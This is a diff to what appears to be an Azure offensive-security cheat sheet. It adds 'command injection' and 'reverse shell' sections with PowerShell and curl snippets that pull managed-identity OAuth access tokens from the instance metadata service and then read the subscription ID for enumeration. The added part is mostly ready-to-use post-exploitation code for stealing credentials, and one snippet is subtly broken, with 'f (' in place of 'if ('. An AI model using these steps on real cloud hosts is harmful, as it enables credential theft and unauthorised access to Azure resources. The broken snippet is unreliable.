@@ -296,9 +296,37 @@ env
 ```
 
 #### Request access token for managed identity
+
+#### Command injection
 ```
 curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
 ```
+OR 
+
+#### reverse shell 
+
+in a reverse shell, execute REST API
+
+Get Oauth token from management endpoint (ARM)
+```
+  if ($ArmToken -eq ''){
+        $response = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
+        $content = $response.Content | ConvertFrom-Json
+        $ArmToken = $content.access_token
+    }
+
+```
+
+Go to enumerate the case again - check subscription
+
+```
+f ($subID -eq ''){
+        $response2 = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/instance?api-version=2018-02-01' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
+        $subID = ($response2.Content | ConvertFrom-Json).compute.subscriptionId
+    }
+    
+ ```
+ 
 
 #### Request access token for managed identity html file upload
 ```
